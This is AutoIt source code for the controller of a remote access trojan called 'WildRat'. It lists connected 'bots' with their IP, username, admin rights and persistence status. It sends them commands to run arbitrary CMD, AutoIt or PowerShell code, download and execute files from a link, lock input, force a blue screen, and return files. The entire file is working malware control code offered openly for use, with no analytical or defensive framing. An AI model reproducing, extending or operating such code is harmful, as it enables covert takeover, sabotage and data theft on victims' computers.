#Region 	;////    #Settings   ////;
#include "_TCP.au3"
#include "_SkinCrafter.au3"
#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <ListViewConstants.au3>
#include <EditConstants.au3>
#include <StaticConstants.au3>
#include <TabConstants.au3>
#include <WindowsConstants.au3>
#include <GuiListView.au3>
#include <MsgBoxConstants.au3>
#include <ComboConstants.au3>
#EndRegion 	;////    #Settings   ////;

#Region		;////     Config     ////;
$Version = "0.0.5"
$Server_Port = "88"
#EndRegion		;////     Config     ////;

#Region		;////    Startup     ////;
GUIRegisterMsg($WM_NOTIFY, "SortListView")
OnAutoItExitRegister("ExitFunc")
$fSortSense = False
$bFile = False
$hFile = 0
$sFileName = ""
Init()
#EndRegion		;////    Startup     ////;

#Region 	;//// User Interface ////;
$Form = GUICreate("WildRat " & $Version, 1042, 570, 189, 121)
$Tabs = GUICtrlCreateTab(10, 10, 1027, 552)
GUICtrlSetFont(-1, 10, 400, 0, "Arial")
$TabClientsList = GUICtrlCreateTabItem("Client list")
$ListViewClientsList = GUICtrlCreateListView("ID|Country|IP|Computer Name|Username|Admin|Persistence|OS Version|x86/x64|Version", 16, 42, 1015, 485)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 0, 31)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 1, 62)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 2, 120)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 3, 123)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 4, 110)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 5, 50)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 6, 86)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 7, 111)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 8, 68)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 9, 135)
GUICtrlSetFont(-1, 10, 400, 0, "MS Sans Serif")
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 1, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 2, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 3, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 4, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 5, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 6, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 7, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 8, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListViewClientsList), 9, 2)
$LabelConnectedCount = GUICtrlCreateLabel("0 Clients connected", 16, 536, 120, 20)
GUICtrlSetFont(-1, 10, 400, 0, "MS Sans Serif")
$ButtonKillAll = GUICtrlCreateButton("Kill all bots!", 144, 531, 75, 25)
$ButtonRefresh = GUICtrlCreateButton("Refresh", 960, 531, 65, 25)
$TabCommands = GUICtrlCreateTabItem("Commands")
$LabelChosenName = GUICtrlCreateLabel(" No client chosen.", 16, 37, 538, 20)
$LabelChosenIP = GUICtrlCreateLabel(" No client chosen.", 16, 52, 538, 20)
$ButtonRunCommand = GUICtrlCreateButton("Run CMD Command", 18, 68, 187, 25)
$ButtonMessageBox = GUICtrlCreateButton("Pop up message box", 18, 96, 187, 25)
$ButtonOpenWebsite = GUICtrlCreateButton("Open website", 18, 124, 187, 25)
$ButtonBlockInput = GUICtrlCreateButton("Lock keyboard and mouse", 18, 152, 187, 25)
$ButtonUnblockInput = GUICtrlCreateButton("Unlock  keyboard and mouse", 210, 152, 187, 25)
$ButtonOpenCD = GUICtrlCreateButton("Open all CD-Trays", 18, 180, 187, 25)
$ButtonCloseCD = GUICtrlCreateButton("Close all CD-Trays", 210, 180, 187, 25)
$ButtonAskQuestion = GUICtrlCreateButton("Ask question", 18, 264, 187, 25)
$ButtonCauseBSOD = GUICtrlCreateButton("Cause BSOD", 18, 208, 187, 25)
$ButtonDAE = GUICtrlCreateButton("Download and Execute", 18, 236, 187, 25)
$ButtonSendCustomCommand = GUICtrlCreateButton("Run", 978, 531, 50, 23)
$CustomCommandSelection = GUICtrlCreateCombo("", 18, 532, 121, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "Run in CMD|Run as AutoIt Script|Run in Powershell (DO NOT USE - CRASHES CLIENT!)")
$CustomCommand = GUICtrlCreateInput("", 147, 532, 825, 21)
$LabelInfoBlockInput = GUICtrlCreateLabel("(Currently unlocks if CTRL+ALT+DEL is pressed. Needs admin.)", 408, 157, 404, 20)
GUICtrlCreateTabItem("")
$codedby = GUICtrlCreateLabel(" Coded by Wildbook", 788, 10, 127, 20)
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###

#Region 	;////  Program Loop  ////;
While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		Case $ButtonKillAll
			_TCP_Server_Broadcast("EXIT")
		Case $ButtonRunCommand
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "CMD|" & _InputBox("", "Command to send:"))
			EndIf
		Case $ButtonMessageBox
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "MSGBOX|" & _InputBox("", "Message box title:") & "|" & _InputBox("", "Message box text:"))
			EndIf
		Case $ButtonOpenWebsite
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "SHE|" & _InputBox("", "Website to open (with http://):"))
			EndIf
		Case $ButtonBlockInput
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "KML|LOCK")
			EndIf
		Case $ButtonUnblockInput
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "KML|UNLOCK")
			EndIf
		Case $ButtonAskQuestion
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "ASK|" & _InputBox("", "Question box title:") & "|" & _InputBox("", "Question to ask:"))
			EndIf
		Case $ButtonRefresh
			_GUICtrlListView_DeleteAllItems($ListViewClientsList)
			_TCP_Server_Broadcast("GETDATA")
			GUICtrlSetData($LabelConnectedCount, _GUICtrlListView_GetItemCount($ListViewClientsList) & " Clients connected.")
		Case $ButtonCauseBSOD
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "BSOD")
			EndIf
		Case $ButtonDAE
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "DAE|" & _InputBox("", "Where to save the file?", "C:\") & "|" & _InputBox("", "A direct link to the file please?", "http://"))
			EndIf
		Case $ButtonCloseCD
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "CDCLOSE")
			EndIf
		Case $ButtonOpenCD
			$id = SelectedID()
			If Not $id = 0 Then
				_TCP_Send($id, "CDOPEN")
			EndIf
		Case $ButtonSendCustomCommand
			$id = SelectedID()
			If Not $id = 0 Then
				Switch GUICtrlRead($CustomCommandSelection)
					Case "Run in CMD"
						_TCP_Send($id, "CMD|" & GUICtrlRead($CustomCommand))
					Case "Run as AutoIt Script"
						_TCP_Send($id, "CALL|" & GUICtrlRead($CustomCommand))
					Case "Run in Powershell"
						_TCP_Send($id, "PWS|" & GUICtrlRead($CustomCommand))
					Case Else
						MsgBox(0, "", "No command type specified")
				EndSwitch
			EndIf
		Case $Tabs
			$ConnectedTo = GUICtrlRead(GUICtrlRead($ListViewClientsList))
			If Not $ConnectedTo = 0 Then
				$ConnectedToData = StringSplit($ConnectedTo, "|")
				GUICtrlSetData($LabelChosenName, " Connected to: " & $ConnectedToData[5])
				GUICtrlSetData($LabelChosenIP, " Through IP: " & _TCP_Server_ClientIP($ConnectedToData[1]))
			Else
				GUICtrlSetData($LabelChosenName, " No client chosen.")
				GUICtrlSetData($LabelChosenIP, " No client chosen.")
			EndIf
	EndSwitch
WEnd
#EndRegion 	;////  Program Loop  ////;

#Region		;////   Functions    ////;
Func Recieved($hSocket, $sReceived, $iError)
	;MsgBox(0, "", "SERVER: We received this: " & $sReceived)
	ConsoleWrite($hSocket & ":" & $sReceived & @CRLF)
	If $bFile = True And $hFile = $hSocket Then
		FileWrite(FileSaveDialog("Save as:", "", "(*.*)", 0, $sFileName), $sReceived)
		$bFile = False
		$hFile = ""
		$sFileName = ""
	Else
		$info = StringSplit($sReceived, "|")
		Switch $info[1]
			Case "PCINFO"
				GUICtrlCreateListViewItem($hSocket & "|" & StringTrimLeft($sReceived, 7), $ListViewClientsList)
				GUICtrlSetData($LabelConnectedCount, _GUICtrlListView_GetItemCount($ListViewClientsList) & " Clients connected.")
			Case "ANSWER"
				MsgBox(00, $info[2], $info[3])
			Case "FILE"
				$bFile = True
				$hFile = $hSocket
				$sFileName = $info[2]
		EndSwitch
	EndIf

EndFunc   ;==>Recieved
Func NewClient($hSocket, $iError)
	;ToolTip("SERVER: New client connected." & @CRLF & "", @DesktopWidth / 2, @DesktopHeight / 2, "", "", 2)
	Sleep(1000)
	_TCP_Send($hSocket, "GETDATA")
	GUICtrlSetData($LabelConnectedCount, _GUICtrlListView_GetItemCount($ListViewClientsList) & " Clients connected.")
EndFunc   ;==>NewClient
Func Disconnect($hSocket, $iError)
	_GUICtrlListView_DeleteAllItems($ListViewClientsList)
	_TCP_Server_Broadcast("GETDATA")
	GUICtrlSetData($LabelConnectedCount, _GUICtrlListView_GetItemCount($ListViewClientsList) & " Clients connected.")
EndFunc   ;==>Disconnect
Func Init()
	ToolTip("SERVER: Starting up server...", @DesktopWidth / 2, @DesktopHeight / 2, "", "", 2)
	Global $hServer = _TCP_Server_Create($Server_Port)
	_TCP_RegisterEvent($hServer, $TCP_NEWCLIENT, "NewClient")
	_TCP_RegisterEvent($hServer, $TCP_DISCONNECT, "Disconnect")
	_TCP_RegisterEvent($hServer, $TCP_RECEIVE, "Recieved")
	ToolTip("")
EndFunc   ;==>Init
Func SelectedID()
	$ConnectedTo = GUICtrlRead(GUICtrlRead($ListViewClientsList))
	If Not $ConnectedTo = 0 Then
		$ConnectedToName = StringSplit($ConnectedTo, "|")
		Return $ConnectedToName[1]
	Else
		MsgBox(00, "Error!", 'No client chosen in the "Clients list"')
		Return 0
	EndIf
EndFunc   ;==>SelectedID
Func ExitFunc()
	_TCP_Server_Stop()
EndFunc   ;==>ExitFunc
Func SortListView($hWnd, $iMsg, $wParam, $lParam)
	#forceref $hWnd, $iMsg, $wParam
	Local $hWndListView = $ListViewClientsList
	If Not IsHWnd($ListViewClientsList) Then $hWndListView = GUICtrlGetHandle($ListViewClientsList)
	Local $tNMHDR = DllStructCreate($tagNMLISTVIEW, $lParam)
	Local $hWndFrom = HWnd(DllStructGetData($tNMHDR, "hWndFrom"))
	Local $iCode = DllStructGetData($tNMHDR, "Code")
	Switch $hWndFrom
		Case $hWndListView
			Switch $iCode
				Case $LVN_COLUMNCLICK ; A column was clicked
					_GUICtrlListView_SimpleSort($hWndListView, $fSortSense, DllStructGetData($tNMHDR, "SubItem")) ; Sort direction for next sort toggled by default
			EndSwitch
	EndSwitch
	Return $GUI_RUNDEFMSG
EndFunc   ;==>SortListView
Func _InputBox($1, $2, $3 = "", $4 = "")
	$input = InputBox($1, $2, $3, $4)
	While $input = ""
		$input = InputBox($1, $2, $3, $4)
	WEnd
	Return $input
EndFunc
#EndRegion		;////   Functions    ////;
